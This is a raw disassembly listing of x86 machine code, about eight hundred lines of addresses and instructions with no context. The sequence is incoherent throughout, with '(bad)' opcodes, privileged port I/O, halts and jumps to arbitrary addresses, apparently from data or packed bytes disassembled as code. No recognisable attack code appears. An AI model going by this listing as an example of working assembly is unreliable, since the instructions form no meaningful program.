  422a0e:	xor    ah,BYTE PTR [edx+ebx*2]
  422a11:	data16 jne 0x42299d
  422a14:	cdq    
  422a15:	ins    BYTE PTR es:[edi],dx
  422a16:	and    eax,0x826be8d6
  422a1b:	pop    edx
  422a1c:	scas   al,BYTE PTR es:[edi]
  422a1d:	and    eax,ebx
  422a1f:	imul   edx,esi,0x68
  422a22:	mul    BYTE PTR [eax+0x50867f8f]
  422a28:	sahf   
  422a29:	xor    ch,al
  422a2b:	xor    al,0x5d
  422a2d:	(bad)
  422a30:	sub    al,0xab
  422a32:	sub    esi,0x23
  422a35:	ds jns 0x422aaf
  422a38:	xchg   ecx,eax
  422a39:	lahf   
  422a3a:	in     al,0x1f
  422a3c:	pop    edx
  422a3d:	pop    ecx
  422a3e:	aas    
  422a3f:	xchg   ebp,eax
  422a40:	mov    eax,ds:0x1c77b9fb
  422a45:	aad    0x93
  422a47:	mov    BYTE PTR [ebp-0x3a9b2552],cl
  422a4d:	ds in  al,dx
  422a4f:	mov    ?,eax
  422a51:	xchg   esi,eax
  422a52:	aam    0x62
  422a54:	push   cs
  422a55:	xor    al,0xec
  422a57:	cwde   
  422a58:	loopne 0x422a02
  422a5a:	mov    ecx,0xfdf110f2
  422a5f:	arpl   WORD PTR [edi],di
  422a61:	mov    al,ds:0xf3d75311
  422a66:	dec    edx
  422a67:	(bad)  
  422a68:	mov    eax,0xc1af13f8
  422a6d:	xor    DWORD PTR [ecx],ecx
  422a6f:	lock cmpxchg DWORD PTR [edi-0x404d4c16],eax
  422a77:	cwde   
  422a78:	jbe    0x422a3b
  422a7a:	push   0xffffffed
  422a7c:	dec    edi
  422a7d:	push   ecx
  422a7e:	push   edx
  422a7f:	shl    BYTE PTR [ebx],0x83
  422a82:	xchg   ecx,eax
  422a83:	push   ebp
  422a84:	or     esp,ebx
  422a86:	mov    cl,0xd
  422a88:	test   BYTE PTR [ecx+edx*8],bh
  422a8b:	mov    bh,0xe1
  422a8d:	mov    al,BYTE PTR [edi+0x65]
  422a90:	pop    es
  422a91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a92:	or     al,0xe8
  422a94:	ins    DWORD PTR es:[edi],dx
  422a95:	shl    DWORD PTR [ebx],1
  422a97:	dec    ebx
  422a98:	int3   
  422a99:	sbb    ecx,DWORD PTR [esi+eax*4+0x61c1c026]
  422aa0:	sub    bh,BYTE PTR [edi*1+0x7214eb6f]
  422aa7:	cli    
  422aa8:	mov    dl,BYTE PTR [ebx-0x3b25879d]
  422aae:	jle    0x422a97
  422ab0:	xor    al,0xa1
  422ab2:	mov    edx,esp
  422ab4:	ror    DWORD PTR [esi],1
  422ab6:	es xchg ecx,eax
  422ab8:	cmp    BYTE PTR [edx+0x1e64811e],ah
  422abe:	aam    0x49
  422ac0:	in     eax,dx
  422ac1:	loope  0x422aef
  422ac3:	or     eax,0x37ec1132
  422ac8:	dec    ebx
  422ac9:	pop    edi
  422aca:	lods   eax,DWORD PTR ds:[esi]
  422acb:	clc    
  422acc:	hlt    
  422acd:	iret   
  422ace:	jnp    0x422b3e
  422ad0:	xchg   BYTE PTR [ebp+0x4163018c],dh
  422ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ad7:	push   edx
  422ad8:	call   0xf0b00eb9
  422add:	data16 es xor cl,dh
  422ae1:	pushf  
  422ae2:	xchg   DWORD PTR [edx+0x1e],esi
  422ae5:	idiv   DWORD PTR [edx-0x36207019]
  422aeb:	pop    es
  422aec:	sub    DWORD PTR [edi+eiz*4+0x7c],ebp
  422af0:	fs int3 
  422af2:	jmp    0x422b69
  422af4:	sub    ebx,DWORD PTR ss:[edi]
  422af7:	(bad)  
  422af8:	das    
  422af9:	push   ds
  422afa:	mov    ch,0x89
  422afc:	fstp   DWORD PTR [eax-0x6399be67]
  422b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b03:	adc    BYTE PTR [ecx],0x6d
  422b06:	cdq    
  422b07:	xor    eax,0x5af52c30
  422b0c:	adc    dh,ah
  422b0e:	mov    eax,esp
  422b10:	out    0xf9,al
  422b12:	mov    eax,0xed542581
  422b17:	mov    ebp,0x5085af23
  422b1c:	arpl   ax,sp
  422b1e:	mov    esi,0x807ed747
  422b23:	stos   BYTE PTR es:[edi],al
  422b24:	jmp    0x8f82:0xedf07d6a
  422b2b:	bound  esi,QWORD PTR [edx-0x13dad9c2]
  422b31:	ret    0x2882
  422b34:	jecxz  0x422b30
  422b36:	popf   
  422b37:	ja     0x422bab
  422b39:	ja     0x422b46
  422b3b:	xor    al,0x1c
  422b3d:	push   edx
  422b3e:	shl    DWORD PTR [edi-0x15],0x23
  422b42:	mov    edx,DWORD PTR [edx-0x3d1dee76]
  422b48:	inc    edi
  422b49:	int    0x76
  422b4b:	or     al,BYTE PTR [eax-0x73]
  422b4e:	jb     0x422bcc
  422b50:	push   ds
  422b51:	mov    cl,0xf8
  422b53:	inc    edi
  422b54:	xchg   edx,eax
  422b55:	xor    DWORD PTR [edx+esi*2-0x2d],ebx
  422b59:	cs das 
  422b5b:	mov    ds:0x74ff7310,al
  422b60:	ror    DWORD PTR [edi-0x4c],0x8c
  422b64:	or     ah,BYTE PTR [esi]
  422b66:	lahf   
  422b67:	and    DWORD PTR [ecx],edi
  422b69:	sbb    BYTE PTR [ecx+0x336d6aac],ah
  422b6f:	test   DWORD PTR [ebp-0x17c7916f],ecx
  422b75:	jge    0x422b47
  422b77:	xchg   BYTE PTR [eax+ebp*2],bh
  422b7a:	push   esi
  422b7b:	dec    esp
  422b7c:	cmc    
  422b7d:	cmc    
  422b7e:	fwait
  422b7f:	adc    ecx,DWORD PTR [ebx+0x7c73e5c0]
  422b85:	dec    ebx
  422b86:	inc    esi
  422b87:	or     DWORD PTR [eax-0x527a50f4],0xffffffa6
  422b8e:	gs ins BYTE PTR es:[edi],dx
  422b90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b91:	fnstenv [esi+eiz*1+0x73]
  422b95:	sub    BYTE PTR [edi+0x2d],ch
  422b98:	cld    
  422b99:	cwde   
  422b9a:	fcomp  QWORD PTR [ebx-0xe7e7a88]
  422ba0:	ret    0x15c7
  422ba3:	add    bh,dl
  422ba5:	test   BYTE PTR [ecx*1-0x786e82a8],bl
  422bac:	or     dl,BYTE PTR [edi]
  422bae:	and    esi,DWORD PTR [ebp+0x7d0afc1b]
  422bb4:	dec    ecx
  422bb5:	push   ds
  422bb6:	gs jae 0x422b5c
  422bb9:	sbb    ebp,DWORD PTR [esi+0x53fb1564]
  422bbf:	add    DWORD PTR [ecx-0x6b],0xffffff8e
  422bc3:	lea    esi,[ebp+0x713385ef]
  422bc9:	out    dx,eax
  422bca:	xchg   edx,eax
  422bcb:	(bad)  
  422bcd:	sub    eax,0x3b9e68c6
  422bd2:	xor    DWORD PTR [ebx-0x53],0x1a09d20b
  422bd9:	scas   al,BYTE PTR es:[edi]
  422bda:	mov    bh,0x68
  422bdc:	xor    BYTE PTR [eax],dl
  422bde:	in     al,0xce
  422be0:	(bad)  
  422be1:	pop    edx
  422be2:	retf   
  422be3:	jp     0x422c2f
  422be5:	ds xchg ecx,eax
  422be7:	push   0xe8675e56
  422bec:	mov    al,ds:0xd87d8ab6
  422bf1:	jne    0x422c0e
  422bf3:	adc    eax,0x6c2e4d30
  422bf8:	cmc    
  422bf9:	sysret 
  422bfb:	mov    dl,0xa5
  422bfd:	add    esp,DWORD PTR [ebp+ecx*4-0x60c4ac78]
  422c04:	scas   al,BYTE PTR es:[edi]
  422c05:	ja     0x422be5
  422c07:	imul   esi,DWORD PTR [esi],0x4e
  422c0a:	xor    eax,DWORD PTR [ebp-0x1f]
  422c0d:	cmc    
  422c0e:	pop    ebx
  422c0f:	xor    BYTE PTR cs:[ebx],ch
  422c12:	mov    dl,0x68
  422c14:	(bad)  
  422c15:	add    al,0x7c
  422c17:	idiv   BYTE PTR [edx+ecx*4]
  422c1a:	mov    bl,0xe7
  422c1c:	out    dx,eax
  422c1d:	mov    es,ebx
  422c1f:	add    al,bl
  422c21:	ret    0x930e
  422c24:	or     DWORD PTR [esi],ebp
  422c26:	xchg   DWORD PTR [eax+edx*2],eax
  422c29:	aas    
  422c2a:	pushf  
  422c2b:	inc    esp
  422c2c:	mov    DWORD PTR [eax+0xd],ecx
  422c2f:	or     dl,BYTE PTR [ebx-0x55]
  422c32:	adc    dh,dh
  422c34:	inc    esp
  422c35:	retf   0xe3c3
  422c38:	xor    BYTE PTR [ecx-0x6f],0x5a
  422c3c:	jmp    0x92aec4f8
  422c41:	sbb    al,0xaf
  422c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c44:	xchg   esp,eax
  422c45:	mov    ecx,0x27e99883
  422c4a:	push   es
  422c4b:	sbb    al,0xfd
  422c4d:	mov    BYTE PTR [eax],cl
  422c4f:	add    bh,BYTE PTR ds:0xacf8ead8
  422c55:	jle    0x422c97
  422c57:	push   cs
  422c58:	mov    dh,0x5b
  422c5a:	hlt    
  422c5b:	or     dl,BYTE PTR ds:0x9a60f032
  422c61:	push   ecx
  422c62:	jbe    0x422cbf
  422c64:	lahf   
  422c65:	shl    edx,1
  422c67:	mov    al,ds:0xcf38c917
  422c6c:	add    DWORD PTR [ebp-0x42d3756],edx
  422c72:	mov    dl,0xdb
  422c74:	adc    eax,0x8ef153eb
  422c79:	push   cs
  422c7a:	adc    al,0xfe
  422c7c:	test   al,0xe6
  422c7e:	popf   
  422c7f:	add    edx,DWORD PTR [eax]
  422c81:	xchg   esp,eax
  422c82:	pushf  
  422c83:	mov    eax,0xc173a303
  422c88:	clc    
  422c89:	push   eax
  422c8a:	dec    ebx
  422c8b:	jne    0x422ce6
  422c8d:	jp     0x422c36
  422c8f:	stos   BYTE PTR es:[edi],al
  422c90:	scas   al,BYTE PTR es:[edi]
  422c91:	out    dx,al
  422c92:	push   ecx
  422c93:	and    BYTE PTR ds:[edi],ah
  422c96:	mov    eax,ds:0x0
	...
  422d13:	add    BYTE PTR [esi-0x8131a83],cl
  422d19:	cld    
  422d1a:	(bad)  
  422d1b:	jg     0x422d8f
  422d1d:	and    eax,0xa8cc1474
  422d22:	std    
  422d23:	push   ss
  422d24:	into   
  422d25:	ret    0x1
  422d28:	imul   eax,DWORD PTR [edi],0x0
  422d2b:	add    ah,dl
  422d2d:	int    0xee
  422d2f:	(bad)  
  422d30:	stos   BYTE PTR es:[edi],al
  422d31:	ja     0x422d45
  422d33:	jl     0x422d6e
  422d35:	fsub   DWORD PTR [eax+ecx*8]
  422d38:	in     eax,dx
  422d39:	jno    0x422d73
  422d3b:	push   ebp
  422d3c:	xchg   ebx,eax
  422d3d:	cdq    
  422d3e:	(bad)  
  422d3f:	jns    0x422da2
  422d41:	mov    edi,0xa294b987
  422d46:	in     eax,0x3d
  422d48:	add    DWORD PTR [edx-0x5b],ebp
  422d4b:	fwait
  422d4c:	js     0x422d3d
  422d4e:	adc    eax,0x46af8727
  422d53:	xlat   BYTE PTR ds:[ebx]
  422d54:	jecxz  0x422d8b
  422d56:	shl    DWORD PTR [edx],cl
  422d58:	dec    eax
  422d59:	pop    ebx
  422d5a:	mov    al,0x5
  422d5c:	std    
  422d5d:	stos   DWORD PTR es:[edi],eax
  422d5e:	in     eax,dx
  422d5f:	test   edx,0x8ab0916b
  422d65:	mov    esp,0x64043342
  422d6a:	push   ss
  422d6b:	fimul  WORD PTR [edx+0x3]
  422d6e:	xchg   edx,eax
  422d6f:	gs adc esi,0xfffffff4
  422d73:	pop    es
  422d74:	jns    0x422db6
  422d76:	or     ah,BYTE PTR [edx+0x1]
  422d79:	adc    esp,eax
  422d7b:	mov    edx,ebx
  422d7d:	xchg   ebx,eax
  422d7e:	mov    edi,0x469824e2
  422d83:	push   cs
  422d84:	repz in al,dx
  422d86:	inc    ebp
  422d87:	add    dh,dh
  422d89:	sub    BYTE PTR [ebx],cl
  422d8b:	xchg   edx,eax
  422d8c:	cmp    eax,0x42916fec
  422d91:	adc    esp,DWORD PTR [edi-0x24aa0e4b]
  422d97:	pop    edi
  422d98:	push   edx
  422d99:	bnd jne 0x422daf
  422d9c:	mov    ?,WORD PTR [eax]
  422d9e:	mov    cl,0xa2
  422da0:	sbb    al,dh
  422da2:	dec    esp
  422da3:	dec    ebx
  422da4:	push   ecx
  422da5:	lea    ecx,[esi-0x13]
  422da8:	fwait
  422da9:	push   ds
  422daa:	fsqrt  
  422dac:	in     eax,0x41
  422dae:	shr    ebx,0x47
  422db1:	and    al,cl
  422db3:	mov    ecx,0xcf3e1001
  422db8:	out    0x3d,eax
  422dba:	dec    ecx
  422dbb:	jmp    0xc8a98629
  422dc0:	or     DWORD PTR [ebp+edi*8+0x26],ecx
  422dc4:	jecxz  0x422e12
  422dc6:	xchg   BYTE PTR fs:[edx+0x5a],cl
  422dca:	pushf  
  422dcb:	ds lock or al,0x15
  422dcf:	mov    ch,0x75
  422dd1:	mov    ds:0x2d99aec0,al
  422dd6:	mov    dl,0x16
  422dd8:	dec    eax
  422dd9:	mov    esi,0x10e3bcc9
  422dde:	dec    esp
  422ddf:	out    0xd1,eax
  422de1:	repnz mov dl,BYTE PTR [eax+0xa5f6dbf]
  422de8:	push   0xa
  422dea:	adc    eax,0x4dfc3ffa
  422def:	leave  
  422df0:	jo     0x422e6a
  422df2:	imul   ebp,esp,0xffffff98
  422df5:	outs   dx,BYTE PTR ds:[esi]
  422df6:	jae    0x422dcb
  422df8:	std    
  422df9:	imul   ebp,DWORD PTR [ecx+0x54],0xfffffffa
  422dfd:	xor    dh,BYTE PTR [edi-0x38e35975]
  422e03:	fimul  DWORD PTR [esi]
  422e05:	clc    
  422e06:	cmp    DWORD PTR [edi+0x5afdf7bd],ecx
  422e0c:	fwait
  422e0d:	xor    eax,0x45c85a6b
  422e12:	sbb    cl,BYTE PTR [edi]
  422e14:	mov    ds:0x464c2b54,eax
  422e19:	jp     0x422e4e
  422e1b:	inc    edi
  422e1c:	call   0x235d7e75
  422e21:	fmul   DWORD PTR [ecx+ecx*8+0x70]
  422e25:	int3   
  422e26:	lods   al,BYTE PTR ds:[esi]
  422e27:	mov    bl,0x96
  422e29:	loop   0x422e45
  422e2b:	push   0xb83dcbcb
  422e30:	inc    esi
  422e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e32:	mov    bl,0xbd
  422e34:	mov    edi,DWORD PTR ss:[ebx]
  422e37:	mov    WORD PTR [ecx],ds
  422e39:	ins    BYTE PTR es:[edi],dx
  422e3a:	inc    ebp
  422e3b:	ret    
  422e3c:	xor    ecx,DWORD PTR [ecx]
  422e3e:	rcl    BYTE PTR ds:0x806c065e,0x26
  422e45:	xchg   ecx,eax
  422e46:	adc    ebp,edi
  422e48:	mov    al,0x29
  422e4a:	imul   eax,DWORD PTR [ebx-0x7a54e948],0x2c
  422e51:	mov    edi,0xb999c2e2
  422e56:	xor    ecx,eax
  422e58:	ins    DWORD PTR es:[edi],dx
  422e59:	dec    BYTE PTR [ebx]
  422e5b:	and    al,0x9e
  422e5d:	stos   BYTE PTR es:[edi],al
  422e5e:	push   ebx
  422e5f:	add    eax,0x7a2e39b6
  422e64:	push   0xffffffdf
  422e66:	leave  
  422e67:	jp     0x422e4a
  422e69:	jns    0x422e92
  422e6b:	mov    bh,0x82
  422e6d:	mov    al,ds:0x4dd33c7d
  422e72:	sub    cl,BYTE PTR [ebp+eiz*8-0x18ffa28a]
  422e79:	pop    ecx
  422e7a:	xor    BYTE PTR [edx-0x75416642],bh
  422e80:	sub    eax,DWORD PTR [edi-0x50]
  422e83:	(bad)  
  422e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e85:	test   BYTE PTR [esi],dl
  422e87:	das    
  422e88:	into   
  422e89:	lea    esi,[esi]
  422e8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e8c:	push   ebx
  422e8d:	xor    eax,0x653afdd0
  422e92:	imul   edx,DWORD PTR [edi+0x23],0x63a0346c
  422e99:	mov    al,0xa8
  422e9b:	cmc    
  422e9c:	xchg   ebp,eax
  422e9d:	mov    ds:0x36a3b7c1,eax
  422ea2:	mov    BYTE PTR [ebp+edx*1-0x1e],dl
  422ea6:	loop   0x422ea9
  422ea8:	std    
  422ea9:	cmp    BYTE PTR [esi-0x53],0x9d
  422ead:	cmp    ebp,DWORD PTR [ecx-0x5a]
  422eb0:	(bad)  
  422eb1:	xor    al,ch
  422eb3:	xor    DWORD PTR [edi-0x7f],eax
  422eb6:	pop    ecx
  422eb7:	sub    dh,BYTE PTR fs:[edi-0x479b2fa3]
  422ebe:	cwde   
  422ebf:	std    
  422ec0:	mov    esp,0xa0e43fde
  422ec5:	and    BYTE PTR [ebp-0x54],dh
  422ec8:	sbb    dh,BYTE PTR [ebx]
  422eca:	arpl   WORD PTR [edx+0x65],bx
  422ecd:	mov    ds:0xb9980f0a,al
  422ed2:	(bad)  
  422ed3:	or     DWORD PTR [ecx+edx*8],ebx
  422ed6:	jae    0x422f35
  422ed8:	ins    BYTE PTR es:[edi],dx
  422ed9:	jmp    0xe60ad3d0
  422ede:	fsub   st(2),st
  422ee0:	push   es
  422ee1:	mov    ch,0x47
  422ee3:	mov    bl,0xcd
  422ee5:	mov    ds:0x1b85bdec,al
  422eea:	mov    dl,0x4c
  422eec:	(bad)  
  422eed:	(bad)  
  422eee:	pusha  
  422eef:	lods   eax,DWORD PTR ds:[esi]
  422ef0:	(bad)  
  422ef1:	lods   eax,DWORD PTR ds:[esi]
  422ef2:	mov    bl,0xeb
  422ef4:	add    BYTE PTR [ebx-0x80],dl
  422ef7:	add    esp,DWORD PTR [ebx-0x7b]
  422efa:	adc    DWORD PTR [ebx-0x4d],ebx
  422efd:	sahf   
  422efe:	xchg   ecx,eax
  422eff:	xor    BYTE PTR [ebx-0x7],bl
  422f02:	xchg   ecx,eax
  422f03:	sub    eax,0x5e358c16
  422f08:	sbb    dh,BYTE PTR [edx]
  422f0a:	test   BYTE PTR [ebx+0x48],dl
  422f0d:	shl    DWORD PTR [esi+0x6d],0xad
  422f11:	push   esp
  422f12:	sub    al,0x5b
  422f14:	inc    esi
  422f15:	retf   
  422f16:	aas    
  422f17:	test   BYTE PTR [esp+eax*8],al
  422f1a:	pop    eax
  422f1b:	ret    0xb558
  422f1e:	mov    ds:0x7dc8d45,al
  422f23:	test   DWORD PTR gs:[edx],esi
  422f26:	adc    eax,DWORD PTR [eax]
  422f28:	popa   
  422f29:	xchg   DWORD PTR [edx-0xeaef59b],esp
  422f2f:	inc    ecx
  422f30:	ins    BYTE PTR es:[edi],dx
  422f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f32:	and    DWORD PTR [edi-0xa],edx
  422f35:	ja     0x422f78
  422f37:	iret   
  422f38:	outs   dx,DWORD PTR ds:[esi]
  422f39:	add    al,0x4d
  422f3b:	test   DWORD PTR [ecx+0x51489ba2],esp
  422f41:	jg     0x422eca
  422f43:	sbb    bh,BYTE PTR [ebx+0x5e332b50]
  422f49:	js     0x422f1f
  422f4b:	ja     0x422f9f
  422f4d:	sub    al,0x7a
  422f4f:	gs adc al,0xf1
  422f52:	imul   edi,DWORD PTR [edi+eax*8],0x4f5c44ef
  422f59:	imul   esi,DWORD PTR [edi+edi*4+0x2a523148],0xffffff80
  422f61:	cmc    
  422f62:	pop    edi
  422f63:	xor    eax,0xd1b9b3bb
  422f68:	push   ecx
  422f69:	inc    ecx
  422f6a:	test   DWORD PTR [esi+0x1],0x7ef9af47
  422f71:	jge    0x422f27
  422f73:	jl     0x422f73
  422f75:	in     eax,0x21
  422f77:	sub    eax,0xad4b8ce3
  422f7c:	mov    ds:0x53d42e77,eax
  422f81:	add    al,0x9
  422f83:	mov    esi,0x135af2e0
  422f88:	leave  
  422f89:	sbb    esi,DWORD PTR [edx]
  422f8b:	xchg   eax,esi
  422f8d:	mov    al,ds:0xc653734d
  422f92:	mov    eax,0xb682bf33
  422f97:	xchg   bx,ax
  422f99:	cld    
  422f9a:	das    
  422f9b:	or     al,0xf9
  422f9d:	pop    eax
  422f9e:	fsub   st(2),st
  422fa0:	mov    ds:0x44659dc0,al
  422fa5:	mov    eax,0x7f8489a2
  422faa:	scas   al,BYTE PTR es:[edi]
  422fab:	imul   ebp,DWORD PTR [esi+0x66c162e0],0xc
  422fb2:	iret   
  422fb3:	push   0x14
  422fb5:	dec    edx
  422fb6:	gs loopne 0x422fc9
  422fb9:	sub    ah,BYTE PTR gs:[eax]
  422fbc:	push   ds
  422fbd:	mov    ss,eax
  422fbf:	retf   0x9538
  422fc2:	fisttp DWORD PTR [edi+0x10]
  422fc5:	fdivr  QWORD PTR [ebx-0x12]
  422fc8:	cdq    
  422fc9:	iret   
  422fca:	push   0x2d8d5069
  422fcf:	push   es
  422fd0:	push   edx
  422fd1:	(bad)
  422fd4:	fisub  WORD PTR [esi]
  422fd6:	out    0xe9,al
  422fd8:	icebp  
  422fd9:	mov    ds:0xd98f20a3,al
  422fde:	fmulp  st(4),st
  422fe0:	jno    0x423045
  422fe2:	xor    BYTE PTR [ebp-0x6b99fdd9],ah
  422fe8:	ja     0x422ff6
  422fea:	mov    eax,ds:0x8b70a6a
  422fef:	popa   
  422ff0:	or     al,0xde
  422ff2:	test   BYTE PTR [eax-0x41],cl
  422ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ff6:	jo     0x422fbc
  422ff8:	jae    0x422fa3
  422ffa:	shr    BYTE PTR [edx+0x7d892648],0x6
  423001:	bound  ecx,QWORD PTR ds:0xdcae3fb0
  423007:	int3   
  423008:	shr    esi,1
  42300a:	jnp    0x423043
  42300c:	mov    esi,0x27f8df98
  423011:	jl     0x423064
  423013:	daa    
  423014:	pop    esp
  423015:	popf   
  423016:	and    eax,esi
  423018:	cmc    
  423019:	jp     0x42306f
  42301b:	push   ebp
  42301c:	mov    dh,0xb1
  42301e:	outs   dx,BYTE PTR es:[esi]
  423020:	cli    
  423021:	xlat   BYTE PTR ds:[ebx]
  423022:	hlt    
  423023:	inc    ebx
  423024:	shl    esp,1
  423026:	stos   DWORD PTR es:[edi],eax
  423027:	inc    esp
  423028:	jns    0x422fd1
  42302a:	icebp  
  42302b:	xchg   ebx,eax
  42302c:	lahf   
  42302d:	clc    
  42302e:	pop    ecx
  42302f:	mov    dl,0x7c
  423031:	pop    ds
  423032:	inc    ebx
  423033:	dec    ebx
  423034:	push   ebx
  423035:	repz (bad) 
  423037:	mov    BYTE PTR [ebp+0x58],ah
  42303a:	test   DWORD PTR [eax-0x53294d1d],eax
  423040:	fdiv   DWORD PTR [ecx-0x6c]
  423043:	xor    eax,0xd0adf621
  423048:	dec    esi
  423049:	mov    al,ds:0x6d6e00ab
  42304e:	ficom  DWORD PTR [ebp-0x4c2fe55e]
  423054:	dec    esi
  423055:	push   ecx
  423056:	mov    al,ds:0x97387eb8
  42305b:	cwde   
  42305c:	jle    0x4230a3
  42305e:	jae    0x42309d
  423060:	loop   0x42304a
  423062:	ret    0x4100
  423065:	and    al,0xb7
  423067:	aam    0x45
  423069:	outs   dx,BYTE PTR ds:[esi]
  42306a:	mov    eax,ds:0xfb417081
  42306f:	dec    esp
  423070:	xchg   ebx,eax
  423071:	imul   ebx,DWORD PTR ss:[ebx+0x69475845],0xffffffbc
  423079:	xlat   BYTE PTR ds:[ebx]
  42307a:	sub    DWORD PTR [ebx],ebx
  42307c:	pop    eax
  42307d:	jl     0x4230bc
  42307f:	pusha  
  423080:	dec    edi
  423081:	adc    DWORD PTR [esi+0x3d],esp
  423084:	add    al,0x26
  423086:	sub    eax,0x356703a5
  42308b:	lahf   
  42308c:	popf   
  42308d:	imul   ecx,DWORD PTR [edi+0x72f2e197],0x4c65a554
  423097:	inc    ecx
  423098:	mov    esp,0x9340a17f
  42309d:	xchg   ebx,eax
  42309f:	out    dx,eax
  4230a0:	pop    ss
  4230a1:	into   
  4230a2:	mov    esp,0x83679005
  4230a7:	stos   BYTE PTR es:[edi],al
  4230a8:	int    0xe3
  4230aa:	in     al,dx
  4230ab:	scas   al,BYTE PTR es:[edi]
  4230ac:	xchg   esi,eax
  4230ad:	cmp    al,cl
  4230af:	push   cs
  4230b0:	xchg   ebp,eax
  4230b1:	xchg   DWORD PTR [esi-0x31],esi
  4230b4:	lds    ebx,FWORD PTR [ebp+0x4cc75ed3]
  4230ba:	enter  0xc3d2,0x5f
  4230be:	adc    eax,0xc730d512
  4230c3:	adc    eax,0xd43b8090
  4230c8:	popa   
  4230c9:	jno    0x423117
  4230cb:	in     al,dx
  4230cc:	out    0x13,eax
  4230ce:	adc    eax,0x219febaa
  4230d3:	adc    al,BYTE PTR [edx]
  4230d5:	ret    0x4a96
  4230d8:	jmp    0x30fc0ffb
  4230dd:	jle    0x42306b
  4230df:	or     ecx,esp
  4230e1:	mov    WORD PTR [ebx-0x504e2d97],?
  4230e7:	xchg   esi,eax
  4230e8:	adc    DWORD PTR [edi-0x161191a1],0x53e8cd7c
  4230f2:	pop    esi
  4230f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230f4:	stos   DWORD PTR es:[edi],eax
  4230f5:	cmc    
  4230f6:	hlt    
  4230f7:	imul   esi,edx,0x1f
  4230fa:	xor    BYTE PTR [esi+ebx*2+0x40cc2e41],dl
  423101:	ficom  WORD PTR [edi-0xec798f0]
  423107:	add    eax,DWORD PTR ds:0x50dca393
  42310d:	adc    BYTE PTR [ecx],cl
  42310f:	xor    ch,BYTE PTR [esi-0x34]
  423112:	mov    ecx,0xab6901bc
  423117:	add    eax,0x519bb673
  42311c:	bound  eax,QWORD PTR [eax+0x37]
  42311f:	adc    DWORD PTR [ebx-0x51],edx
  423122:	push   0xcee6638d
  423127:	mov    cs,WORD PTR [edx+ecx*1]
  42312a:	cmp    al,0x82
  42312c:	mov    esi,0xf27d0703
  423131:	adc    al,0xaa
  423133:	jbe    0x4230b5
  423135:	push   ds
  423136:	push   ss
  423137:	push   esi
  423138:	push   esi
  423139:	mov    bh,0x48
  42313b:	scas   al,BYTE PTR es:[edi]
  42313c:	outs   dx,BYTE PTR ds:[esi]
  42313d:	lea    edx,[ebx+0x4bb58dfe]
  423143:	mov    bh,0xd3
  423145:	fs in  eax,0xdb
  423148:	cmp    al,0xb1
  42314a:	add    al,0xb0
  42314c:	shl    cl,1
  42314e:	mov    ch,dh
  423150:	std    
  423151:	test   DWORD PTR [ecx-0x4210ba4c],0x24a27a7e
  42315b:	sbb    DWORD PTR [ebx-0x44cf452d],ecx
  423161:	push   ss
  423162:	int3   
  423163:	addr16 add al,dh
  423166:	and    dl,BYTE PTR [ecx+0x49c3495b]
  42316c:	in     eax,dx
  42316d:	pushf  
  42316e:	es hlt 
  423170:	adc    al,0x60
  423172:	jbe    0x423118
  423174:	sbb    esi,edx
  423176:	adc    dh,ah
  423178:	out    dx,al
  423179:	sbb    dh,BYTE PTR [esi]
  42317b:	jge    0x4231a6
  42317d:	mov    eax,ds:0x96ae3747
  423182:	or     al,0xfa
  423184:	aaa    
  423185:	jae    0x4231cf
  423187:	retf   
  423188:	xchg   esi,eax
  423189:	addr16 addr16 (bad) 
  42318d:	int3   
  42318e:	cmp    edx,DWORD PTR [edi-0x1a]
  423191:	stos   BYTE PTR es:[edi],al
  423192:	ds or  eax,ecx
  423195:	xchg   ebp,eax
  423196:	into   
  423197:	stos   BYTE PTR es:[edi],al
  423198:	aad    0x38
  42319a:	stos   DWORD PTR es:[edi],eax
  42319b:	lods   eax,DWORD PTR ds:[esi]
  42319c:	outs   dx,DWORD PTR ds:[esi]
  42319d:	jge    0x423131
  42319f:	and    edi,DWORD PTR [ebp-0x5cc71ad4]
  4231a5:	xchg   ecx,eax
  4231a6:	bound  edx,QWORD PTR ds:0x39dfb8dc
  4231ac:	mov    dl,0xe7
  4231ae:	rcl    DWORD PTR ds:0x4d7a7fb8,1
  4231b4:	mov    ah,0xe6
  4231b6:	push   ss
  4231b7:	iret   
  4231b8:	mov    esi,ebp
  4231ba:	sbb    BYTE PTR [edi+esi*8+0x136e1519],bh
  4231c1:	dec    esp
  4231c2:	pusha  
  4231c3:	sar    esp,1
  4231c5:	pop    ebp
  4231c6:	cwde   
  4231c7:	imul   esi,ebp,0xb519b22a
  4231cd:	retf   0xe12f
  4231d0:	jg     0x4231fd
  4231d2:	retf   0x5810
  4231d5:	jecxz  0x423177
  4231d7:	ja     0x4231fb
  4231d9:	in     al,dx
  4231da:	dec    edx
  4231db:	adc    dl,BYTE PTR [ebp-0x73]
  4231de:	call   0xfe49da22
  4231e3:	and    DWORD PTR [eax+0x68d7f380],ebx
  4231e9:	xor    al,0x3c
  4231eb:	mov    gs,edi
  4231ed:	jmp    0x6fa0:0x2863e959
  4231f4:	pusha  
  4231f5:	shr    DWORD PTR [ebp+0x10e38f1c],0xb4
  4231fc:	shl    BYTE PTR [ecx-0x5466ee94],1
  423202:	push   cs
  423203:	push   ebx
  423204:	stc    
  423205:	cmovge esi,DWORD PTR [ebp+0x1b]
  423209:	mov    al,0x88
  42320b:	mov    al,0x9c
  42320d:	dec    esp
  42320e:	xlat   BYTE PTR ds:[ebx]
  42320f:	xchg   ebx,eax
  423210:	mov    bh,0x22
  423212:	push   esp
  423213:	or     al,0x81
  423215:	and    BYTE PTR [edx-0x30],0xd6
  423219:	addr16 jmp 0x845683d0
  42321f:	leave  
  423220:	pop    edi
  423221:	inc    esp
  423222:	mov    cl,0x36
  423224:	mov    ecx,0xf044d059
  423229:	fadd   DWORD PTR ds:0xf639c697
  42322f:	inc    ebp
  423230:	adc    edi,DWORD PTR [ecx]
  423232:	xchg   esi,eax
  423233:	int    0x4b
  423235:	sub    bl,0x7
  423238:	adc    al,cl
